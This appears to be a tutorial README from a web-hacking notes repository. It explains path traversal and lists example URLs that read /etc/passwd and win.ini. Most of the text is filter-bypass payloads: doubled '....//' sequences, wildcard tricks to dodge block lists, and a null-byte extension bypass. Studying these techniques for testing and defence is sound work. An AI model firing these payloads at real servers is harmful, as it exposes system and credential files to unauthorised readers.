# Path traversal.
Path traversal is also known as directory traversal. These vulnerabilities ***enable an attacker to read arbitrary files on the server that is running an application***. <br />
In some cases, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior, and ultimately take full control of the server. 

## Reading arbitrary files via path traversal
Imagine a shopping application that displays images of items for sale. This might load an image using the following HTML:<br />
`<img src="/loadImage?filename=218.png">`<br />
The loadImage **URL takes a filename parameter and returns the contents of the specified file**. The image files are stored on disk in the location `/var/www/images/`. To return an image, the application appends the requested filename to this base directory and uses a filesystem API to read the contents of the file. In other words, the application reads from the following file path:<br />
`/var/www/images/218.png`<br />
This application implements no defenses against path traversal attacks. As a result, an attacker can request the following URL to retrieve the `/etc/passwd` file from the server's filesystem:<br />
`https://insecure-website.com/loadImage?filename=../../../etc/passwd`
On Windows, both ../ and ..\ are valid directory traversal sequences. The following is an example of an equivalent attack against a Windows-based server:
`https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini`

----------------------------------------------------

# Path traversal Types and Serialization.
## Absolut Path traversal.
In this type of Path traversal, results can be obtained by using the absolute path:<br />
`https://insecure-website.com/loadImage?filename=/etc/passwd`

## Relative Path traversal.
`https://insecure-website.com/loadImage?filename=../../../etc/passwd`

## Non-Recursive Sanitization Traversal.
In some cases, serialization techniques detect the path `../` and delete it. We can bypass this by doubling it and using `....//`:<br />
`https://insecure-website.com/loadImage?filename=....//....//....//....//etc/passwd`

## Black list bypass.
In other cases the server may have a black list that find some maches and invalidate them like `passwd`. We can bypass it using regular expresions `pass*`: <br />
`https://insecure-website.com/loadImage?filename=....//....//....//....//etc/pass*`<br />
`https://insecure-website.com/loadImage?filename=../../../../../etc/ho?ts`<br />
`https://insecure-website.com/loadImage?filename=../../../../../e??/pa????`<br />


## Null byte Path Traversal.
Sometimes the developer may concatenate an exension to the file being searched. In this case, if we attempt to obtain the `/etc/passwd` , we might actually be searching for `/etc/passwd.php`. We can avoid this technique (Only if the PHP version is outdated) by using a null byte to override the extension.<br />
`https://insecure-website.com/loadImage?filename=../../../../../etc/passwd%00`<br />

## Extension validation.
It's possible to configure the server to search only for the files with a especific exetension. For example, the target may only display a file if its extension is not `.txt`. <br /><br />
We can bypass this type of restriction in outdated PHP versions by using `./`.<br />
![2](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/158c34c8-3339-4974-9a9d-f931b0e55527)
![3](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/0e7bc4b8-790b-4372-9e17-62dd812909de)

